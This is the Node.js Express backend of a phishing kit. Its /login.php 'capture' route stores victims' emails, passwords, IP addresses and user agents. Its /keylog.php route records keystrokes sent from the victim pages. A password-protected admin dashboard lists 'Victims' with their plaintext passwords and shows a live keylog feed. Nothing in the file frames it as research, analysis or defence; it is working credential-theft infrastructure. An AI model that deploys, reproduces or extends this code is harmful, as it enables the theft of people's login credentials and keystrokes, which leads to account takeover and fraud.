const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'change-this-in-production';

// ── JSON file database ──
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const CREDS_FILE = path.join(DATA_DIR, 'credentials.json');
const KEYLOGS_FILE = path.join(DATA_DIR, 'keylogs.json');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');

function readJSON(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf-8')); }
  catch { return []; }
}

function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function getConfig() {
  try { return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); }
  catch {
    const cfg = { admin_hash: crypto.createHash('sha256').update('admin123').digest('hex') };
    writeJSON(CONFIG_FILE, cfg);
    return cfg;
  }
}

function nextId(items) {
  if (items.length === 0) return 1;
  return Math.max(...items.map(i => i.id)) + 1;
}

const now = () => new Date().toISOString().replace('T', ' ').slice(0, 19);

// ── Middleware ──
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(require('cookie-parser')());

// ── Static files ──
app.use(express.static(__dirname));

// ── Auth helpers ──
function createToken(username) {
  return jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
}

function verifyToken(token) {
  try { return jwt.verify(token, JWT_SECRET); } catch { return null; }
}

function requireAdmin(req, res, next) {
  const token = req.cookies?.admin_token;
  const user = token ? verifyToken(token) : null;
  if (!user) return res.redirect('/admin_login.php');
  req.adminUser = user;
  next();
}

// ── GET /admin_login.php ──
app.get('/admin_login.php', (req, res) => {
  const token = req.cookies?.admin_token;
  if (token && verifyToken(token)) return res.redirect('/admin.php');
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Login</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,sans-serif;background:#111;color:#e8eaed;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#1a1a1a;border-radius:16px;padding:48px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,.5);text-align:center}
.card svg{margin-bottom:16px}.card h1{font-size:24px;font-weight:500;margin-bottom:4px}.card p{color:#9aa0a6;font-size:14px;margin-bottom:24px}
.card input{width:100%;height:48px;border-radius:10px;border:1px solid #333;background:#222;color:#e8eaed;padding:0 16px;font-size:15px;outline:none;margin-bottom:12px;font-family:inherit}
.card button{width:100%;height:48px;border-radius:999px;border:none;background:#1a73e8;color:#fff;font-size:15px;font-weight:500;cursor:pointer;font-family:inherit}
.card button:hover{filter:brightness(1.1)}.card .err{background:#5f2121;color:#f28b82;padding:10px 16px;border-radius:8px;font-size:13px;margin-bottom:20px}</style></head><body>
<div class="card"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg><h1>Admin Panel</h1><p>Enter your credentials</p>
<form method="post"><input name="username" placeholder="admin" required autofocus><input type="password" name="password" placeholder="admin123" required><button type="submit">Sign In</button></form></div></body></html>`);
});

// ── POST /admin_login.php ──
app.post('/admin_login.php', (req, res) => {
  const username = (req.body.username || '').trim();
  const password = req.body.password || '';
  const cfg = getConfig();
  const hash = crypto.createHash('sha256').update(password).digest('hex');

  if (username === 'admin' && hash === cfg.admin_hash) {
    const token = createToken(username);
    res.cookie('admin_token', token, { httpOnly: true, maxAge: 86400000, sameSite: 'lax', path: '/' });
    return res.redirect('/admin.php');
  }

  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Login</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,sans-serif;background:#111;color:#e8eaed;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#1a1a1a;border-radius:16px;padding:48px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,.5);text-align:center}
.card svg{margin-bottom:16px}.card h1{font-size:24px;font-weight:500;margin-bottom:4px}.card p{color:#9aa0a6;font-size:14px;margin-bottom:24px}
.card input{width:100%;height:48px;border-radius:10px;border:1px solid #333;background:#222;color:#e8eaed;padding:0 16px;font-size:15px;outline:none;margin-bottom:12px;font-family:inherit}
.card button{width:100%;height:48px;border-radius:999px;border:none;background:#1a73e8;color:#fff;font-size:15px;font-weight:500;cursor:pointer;font-family:inherit}
.card button:hover{filter:brightness(1.1)}.card .err{background:#5f2121;color:#f28b82;padding:10px 16px;border-radius:8px;font-size:13px;margin-bottom:20px}</style></head><body>
<div class="card"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg><h1>Admin Panel</h1><p>Enter your credentials</p>
<div class="err">Invalid username or password</div>
<form method="post"><input name="username" placeholder="admin" required autofocus><input type="password" name="password" placeholder="admin123" required><button type="submit">Sign In</button></form></div></body></html>`);
});

// ── API: Login capture ──
app.post('/login.php', (req, res) => {
  const action = req.body.action;

  if (action === 'preflight') {
    const email = (req.body.email || '').trim();
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: 'Invalid email' });
    }
    return res.json({ status: 'ok', email });
  }

  if (action === 'capture') {
    const email = (req.body.email || '').trim();
    const password = req.body.password || '';
    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
    const name = (email.split('@')[0] || '').replace(/[._]/g, ' ').replace(/\d+/g, '').trim() || 'User';
    const ua = req.headers['user-agent'] || '';

    const creds = readJSON(CREDS_FILE);
    creds.push({
      id: nextId(creds),
      name: name.charAt(0).toUpperCase() + name.slice(1),
      email,
      password,
      ip,
      user_agent: ua,
      created_at: now(),
    });
    writeJSON(CREDS_FILE, creds);

    return res.json({ status: 'ok' });
  }

  res.status(400).json({ error: 'Invalid action' });
});

// ── API: Keylog ──
app.post('/keylog.php', (req, res) => {
  const action = req.body.action;
  if (action !== 'log_keys') return res.status(400).json({ error: 'Invalid action' });

  const keysRaw = req.body.keys;
  if (!keysRaw) return res.json({ status: 'empty' });

  try {
    const keysData = JSON.parse(keysRaw);
    const emailId = req.body.email_id || '';
    const pageView = req.body.page_view || '';
    const fullLog = JSON.stringify({ keys: keysData, page: pageView, time: now() });

    const logs = readJSON(KEYLOGS_FILE);
    logs.push({
      id: nextId(logs),
      email_identifier: emailId,
      key_data: JSON.stringify(keysData),
      field_context: pageView,
      full_log: fullLog,
      created_at: now(),
    });
    writeJSON(KEYLOGS_FILE, logs);

    res.json({ status: 'ok' });
  } catch {
    res.status(400).json({ status: 'invalid' });
  }
});

// ── Admin dashboard ──
app.get('/admin.php', requireAdmin, (req, res) => {
  const creds = readJSON(CREDS_FILE).sort((a, b) => b.id - a.id);
  const keylogs = readJSON(KEYLOGS_FILE).sort((a, b) => b.id - a.id).slice(0, 100);

  const totalVictims = creds.length;
  const todayCount = creds.filter(c => (c.created_at || '').startsWith(now().slice(0, 10))).length;
  const uniqueIps = new Set(creds.map(c => c.ip)).size;
  const totalKeys = keylogs.length;
  const lastCapture = creds.length > 0 ? creds[0].created_at : 'No captures yet';

  const search = (req.query.search || '').toLowerCase();
  const page = Math.max(1, parseInt(req.query.page) || 1);
  const perPage = 25;

  let filtered = creds;
  if (search) {
    filtered = creds.filter(c =>
      (c.name || '').toLowerCase().includes(search) ||
      (c.email || '').toLowerCase().includes(search) ||
      (c.ip || '').toLowerCase().includes(search)
    );
  }

  const totalResults = filtered.length;
  const totalPages = Math.max(1, Math.ceil(totalResults / perPage));
  const offset = (page - 1) * perPage;
  const pageCreds = filtered.slice(offset, offset + perPage);

  if (req.query.delete === 'all') {
    writeJSON(CREDS_FILE, []);
    return res.redirect('/admin.php');
  }

  if (req.query.delete) {
    const id = parseInt(req.query.delete);
    writeJSON(CREDS_FILE, creds.filter(c => c.id !== id));
    return res.redirect('/admin.php');
  }

  function esc(s) { return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }

  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,sans-serif;background:#111;color:#e8eaed;display:flex;min-height:100vh}
.sidebar{width:220px;background:#161616;border-right:1px solid #222;padding:20px 12px;display:flex;flex-direction:column;flex-shrink:0}
.sidebar h3{font-size:18px;font-weight:500;margin-bottom:24px;display:flex;align-items:center;gap:10px}
.sidebar nav{flex:1}.sidebar nav a{display:block;padding:10px 12px;border-radius:8px;color:#9aa0a6;text-decoration:none;font-size:14px;margin-bottom:2px}
.sidebar nav a:hover,.sidebar nav a.active{background:#1a73e8;color:#fff}
.sidebar .logout{color:#9aa0a6;text-decoration:none;font-size:13px;padding-top:16px;border-top:1px solid #222}
.main{flex:1;padding:24px;overflow:auto}
.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:#1a1a1a;border-radius:12px;padding:24px;text-align:center}
.stat-card .num{font-size:32px;font-weight:600}.stat-card .lbl{font-size:13px;color:#9aa0a6;margin-top:4px}
.toolbar{display:flex;gap:8px;margin-bottom:16px;align-items:center;flex-wrap:wrap}
.toolbar input{flex:1;min-width:200px;height:40px;border-radius:8px;border:1px solid #333;background:#1a1a1a;color:#e8eaed;padding:0 12px;font-size:13px;outline:none}
.toolbar button,.toolbar a{height:40px;padding:0 16px;border-radius:8px;border:none;font-size:13px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;color:#fff}
.btn-primary{background:#1a73e8}.btn-danger{background:#c5221f}.btn-ghost{background:transparent;border:1px solid #333!important;color:#9aa0a6}
table{width:100%;border-collapse:collapse;font-size:13px;min-width:700px}
th{text-align:left;padding:10px 12px;color:#9aa0a6;font-weight:500;border-bottom:1px solid #222;background:#1a1a1a}
td{padding:10px 12px;border-bottom:1px solid #1a1a1a}
code{background:#222;padding:2px 6px;border-radius:4px;font-size:12px}
.empty{text-align:center;padding:32px;color:#9aa0a6}
.pages{display:flex;justify-content:center;gap:6px;margin-top:16px}
.pages a{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:8px;text-decoration:none;font-size:13px;background:#1a1a1a;color:#e8eaed}
.pages a.active{background:#1a73e8}
.feed{display:flex;flex-direction:column;gap:6px}
.feed-entry{background:#1a1a1a;border-radius:10px;padding:12px}
.feed-entry .meta{font-size:12px;color:#9aa0a6;margin-bottom:6px;display:flex;gap:12px}
.feed-entry .data{font-size:13px;display:flex;gap:8px;flex-wrap:wrap}
@media(max-width:768px){.sidebar{display:none}.main{padding:16px}table{font-size:12px}}
</style></head><body>
<div class="sidebar">
  <h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> Admin</h3>
  <nav>
    <a href="#" class="active" onclick="showTab('dashboard');return false">Dashboard</a>
    <a href="#" onclick="showTab('victims');return false">Victims</a>
    <a href="#" onclick="showTab('keylog');return false">Keylog Feed</a>
  </nav>
  <a href="/admin_logout.php" class="logout">Logout</a>
</div>
<div class="main">
  <div id="tab-dashboard">
    <div class="stats">
      <div class="stat-card"><div class="num">${totalVictims}</div><div class="lbl">Total Victims</div></div>
      <div class="stat-card"><div class="num">${todayCount}</div><div class="lbl">Today</div></div>
      <div class="stat-card"><div class="num">${uniqueIps}</div><div class="lbl">Unique IPs</div></div>
      <div class="stat-card"><div class="num">${totalKeys}</div><div class="lbl">Keystrokes</div></div>
      <div class="stat-card"><div class="num" style="font-size:18px">${esc(lastCapture)}</div><div class="lbl">Last Capture</div></div>
    </div>
  </div>
  <div id="tab-victims" style="display:none">
    <div class="toolbar">
      <form method="get" style="display:flex;gap:8px;flex:1">
        <input name="search" placeholder="Search by name, email, IP..." value="${esc(req.query.search || '')}">
        <button class="btn-primary">Search</button>
        ${search ? '<a href="/admin.php" class="btn-ghost">Clear</a>' : ''}
      </form>
      <a href="/admin.php?delete=all" class="btn-danger" onclick="return confirm('Delete ALL?')">Clear All</a>
    </div>
    <table>
      <thead><tr><th>ID</th><th>Name</th><th>Email</th><th>Password</th><th>IP</th><th>Date</th><th></th></tr></thead>
      <tbody>
        ${pageCreds.length === 0 ? '<tr><td colspan="7" class="empty">No victims captured yet.</td></tr>' : pageCreds.map(c => `
        <tr>
          <td>${c.id}</td>
          <td>${esc(c.name)}</td>
          <td>${esc(c.email)}</td>
          <td><code>${esc(c.password)}</code></td>
          <td>${esc(c.ip)}</td>
          <td style="color:#9aa0a6">${c.created_at}</td>
          <td><a href="/admin.php?delete=${c.id}" class="btn-danger" style="padding:4px 10px;font-size:11px;height:auto" onclick="return confirm('Delete?')">Delete</a></td>
        </tr>`).join('')}
      </tbody>
    </table>
    ${totalPages > 1 ? `<div class="pages">${Array.from({length: totalPages}, (_, i) => `<a href="/admin.php?page=${i+1}${search ? '&search='+encodeURIComponent(req.query.search) : ''}" class="${i+1===page?'active':''}">${i+1}</a>`).join('')}</div>` : ''}
  </div>
  <div id="tab-keylog" style="display:none">
    <div class="feed">
      ${keylogs.length === 0 ? '<div style="text-align:center;color:#9aa0a6;padding:32px">Waiting for keystrokes...</div>' : keylogs.map(k => {
        let keys;
        try { keys = JSON.parse(k.key_data); } catch { keys = {}; }
        return `<div class="feed-entry">
          <div class="meta"><span>${esc(k.email_identifier || 'anonymous')}</span><span>${esc(k.field_context)}</span><span>${k.created_at}</span></div>
          <div class="data">${Object.entries(keys).map(([ctx, val]) => `<span><span style="color:#9aa0a6">${esc(ctx)}:</span> ${esc(val)}</span>`).join('')}</div>
        </div>`;
      }).join('')}
    </div>
  </div>
</div>
<script>
function showTab(t){document.querySelectorAll('.main>div').forEach(d=>d.style.display='none');document.getElementById('tab-'+t).style.display='';document.querySelectorAll('.sidebar nav a').forEach(a=>a.classList.remove('active'));document.querySelector(\`.sidebar nav a[onclick*="\${t}"]\`).classList.add('active');}
const url=new URL(location.href);if(url.searchParams.has('search')||url.searchParams.has('page'))showTab('victims');
</script>
</body></html>`);
});

// ── Admin logout ──
app.get('/admin_logout.php', (req, res) => {
  res.clearCookie('admin_token');
  res.redirect('/admin_login.php');
});

// ── Serve index.html ──
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ── Start ──
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});